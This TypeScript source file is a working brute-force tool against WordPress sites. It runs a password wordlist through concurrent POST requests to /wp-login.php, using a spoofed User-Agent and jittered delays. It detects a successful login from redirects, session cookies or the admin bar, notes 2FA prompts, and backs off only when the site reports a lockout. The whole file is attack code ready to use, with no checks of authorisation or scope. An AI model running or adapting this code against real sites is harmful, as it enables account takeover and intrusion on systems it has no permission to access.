import * as fs from 'fs';
import * as path from 'path';

export interface BruteForceResult {
  target: string;
  username: string;
  techniques_used: string[];
  totalPasswords: number;
  attempts: number;
  successful: boolean;
  password?: string;
  needs2fa?: boolean;
  duration: number;
  evidence: string;
  ai_summary?: string;
  attemptsPerSecond: number;
}

export async function bruteForceWordPressUser(
  targetUrl: string,
  username: string,
  passwordFile: string = 'passwords.txt',
  options?: { workers?: number; delay?: number; timeout?: number; maxAttempts?: number }
): Promise<BruteForceResult> {
  const workers = options?.workers || 5;
  const delayMs = (options?.delay || 0.1) * 1000;
  const timeout = options?.timeout || 10000;
  const maxAttempts = options?.maxAttempts || Infinity;

  const passwordPath = path.resolve(passwordFile);
  if (!fs.existsSync(passwordPath)) {
    throw new Error(`Password file not found: ${passwordPath}`);
  }

  const passwords = fs.readFileSync(passwordPath, 'utf8')
    .split('\n').map(p => p.trim()).filter(p => p.length > 0);

  console.log(`[BruteForce] ${passwords.length.toLocaleString()} passwords, ${workers} workers, target: ${username}`);

  const startTime = Date.now();
  let attempts = 0;
  let found: { password: string; needs2fa?: boolean } | null = null;

  for (let i = 0; i < passwords.length && !found && attempts < maxAttempts; i += workers) {
    const chunk = passwords.slice(i, i + workers);
    const results = await Promise.all(
      chunk.map(async (password) => {
        if (found) return null;
        await new Promise(r => setTimeout(r, delayMs + Math.random() * delayMs));
        if (found) return null; // re-check after delay — a sibling may have succeeded
        const result = await tryLogin(targetUrl, username, password, timeout);
        attempts++;

        if (attempts % 50 === 0) {
          const elapsed = (Date.now() - startTime) / 1000;
          process.stdout.write(`\r  Tried: ${attempts.toLocaleString()} | ${(attempts / elapsed).toFixed(0)} pwd/s | ${password.substring(0, 15)}...`);
        }

        return result;
      })
    );

    const success = results.find(r => r?.success);
    if (success && !found) {
      found = { password: success.password, needs2fa: success.needs2fa };
    }


    const lockouts = results.filter(r => r?.lockedOut).length;
    if (lockouts > workers * 0.6) {
      console.log('\n[BruteForce] Lockout detected, stopping.');
      break;
    }
  }

  const duration = (Date.now() - startTime) / 1000;
  console.log('\n');

  return {
    target: targetUrl,
    username,
    techniques_used: ['form_based_bruteforce'],
    totalPasswords: passwords.length,
    attempts,
    successful: found !== null,
    password: found?.password,
    needs2fa: found?.needs2fa,
    duration,
    attemptsPerSecond: duration > 0 ? attempts / duration : 0,
    evidence: found
      ? `Password found: ${found.password}`
      : `Failed after ${attempts} attempts`,
    ai_summary: found
      ? (found.needs2fa ? 'Password valid but 2FA enabled' : 'Password cracked successfully')
      : 'Password not in wordlist',
  };
}

async function tryLogin(
  targetUrl: string,
  username: string,
  password: string,
  timeoutMs: number
): Promise<{ password: string; success: boolean; needs2fa?: boolean; lockedOut?: boolean } | null> {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const loginUrl = new URL('/wp-login.php', targetUrl).toString();
    const formData = new URLSearchParams({
      log: username,
      pwd: password,
      'wp-submit': 'Log In',
      redirect_to: new URL('/wp-admin/', targetUrl).toString(),
      testcookie: '1',
    });

    const response = await fetch(loginUrl, {
      method: 'POST',
      signal: controller.signal,
      redirect: 'manual',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': loginUrl,
      },
      body: formData.toString(),
    });
    clearTimeout(timeoutId);

    if (response.status === 302 || response.status === 301) {
      const location = response.headers.get('location') || '';
      if (location.includes('wp-admin') || !location.includes('wp-login.php')) {
        return { password, success: true };
      }
    }

    const setCookieHeaders = response.headers.getSetCookie
      ? response.headers.getSetCookie()
      : [response.headers.get('set-cookie') || ''];

    for (const header of setCookieHeaders) {
      if (header && header.includes('wordpress_logged_in_')) {
        return { password, success: true };
      }
    }

    const html = await response.text();

    if (html.includes('id="wpadminbar"') || html.includes('wpadminbar')) {
      return { password, success: true };
    }

    if (/2fa|two[\- ]?factor|authentication code/i.test(html)) {
      return { password, success: true, needs2fa: true };
    }

    if (/too many (failed|attempts)|account (locked|suspended)/i.test(html)) {
      return { password, success: false, lockedOut: true };
    }

    return { password, success: false };
  } catch (error: any) {
    clearTimeout(timeoutId);
    return null;
  }
}